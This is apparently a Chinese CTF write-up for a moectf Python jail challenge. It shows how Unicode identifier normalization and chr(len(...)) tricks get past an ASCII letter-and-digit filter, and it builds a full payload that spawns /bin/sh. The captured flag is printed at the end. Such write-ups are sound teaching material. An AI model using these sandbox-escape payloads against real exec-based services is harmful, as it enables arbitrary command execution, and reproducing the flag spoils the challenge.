# 3z_ban_jail - WriteUp   
> 本题知识点：
> - Python3 对于代码中出现的 Unicode 字符的 ASCII 化处理  

## 背景知识 - Python3的Unicode支持  
Python3 对 Unicode 字符进行了支持，可以使用 Unicode 字符作为标识符  
例如，以下代码可以成功运行  
```python
def 打印(x):
    print(x)

你好世界 = 'Hello, World! 你好！'
打印(你好世界) # 输出 Hello, World! 你好！
```
而且，解释器在遇到一些特殊的字母时，会标准化为一般的 ASCII，比如
```python
print(print == ᵖʳᵢⁿᵗ) # 输出 True
```

## 源码 - chall.py  
```python
import re

def chall():
    code = input('Give me your code: ')

    if re.search(r'[a-zA-Z0-9]',code):
        print('Letters and numbers are not allowed')
        return
    exec(code)
```

## 分析  
### Stage 1
源码用正则表达式简单地筛掉了**ASCII字符**中的大小写字母和数字  
通过背景知识容易想到可以利用**Unicode**绕过检测  
我们的目标Payload如下：  
```python
__import__('subprocess').call('/bin/sh')
```
接下来只需要用一些**Unicode字符**替换一下......  
> :large_blue_circle: [unicode_alter.py - 替换 Unicode 字符的脚本](../code/tools/sandbox/unicode_alter.py)  
```python
__ᵢᵐᵖºʳᵗ__('ſᵘᵇᵖʳºᶜᵉſſ').ᶜªˡˡ('/ᵇᵢⁿ/ſʰ')
```
运行......哎不对 Σ(っ °Д °;)っ  
```
Error: No module named 'ſᵘᵇᵖʳºᶜᵉſſ'
```
还记得背景知识中提到的吗？**只有标识符才会转为ASCII**  
这里的字符串显然不会转换，那有没有什么方式**不用引号来表示字符串呢**？  
有的兄弟，有的！这时候就要请出我们的`chr`大神了  
先将`subprocess`和`/bin/sh`的每个字符变成ASCII值，再使用`chr`转化，最后拼接  
> :large_blue_circle: [chr.py - 将字符串转化为chr拼接的脚本](../code/tools/sandbox/chr.py)  

|字符串|chr拼接|
|-|-|
|subprocess|chr(115)+chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)|
|/bin/sh|chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(115)+chr(104)|

### Stage 2
经过测试，**很多数字的Unicode不能成功识别为ASCII数字**  
那么，数字要怎样绕过呢？  
可以借助一些返回数字的函数，最常用的就是`len`了，只需要传入相应长度的字符串即可  
> :large_blue_circle: [numban.py - 将字符串转换为chr(len('...'))拼接的脚本]  

|字符串|chr+len拼接|
|-|-|
|subprocess|<details><summary>:warning: 过长警告</summary>chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))</details>|
|/bin/sh|<details><summary>:warning: 过长警告</summary>chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))+chr(len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))|  

接下来的工作就是构建最终payload了

## 构建 Payload
最终的Payload如下  
```python
__ᵢᵐᵖºʳᵗ__(ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))).ᶜªˡˡ(ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª"))+ᶜʰʳ(ˡᵉⁿ("ªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªªª")))
```
提交后拿到`/tmp/flag`下的flag  
```bash
cat /tmp/flag
moectf{34b305c6-bfc4-5c0f-f021-5283fd566fae}
```
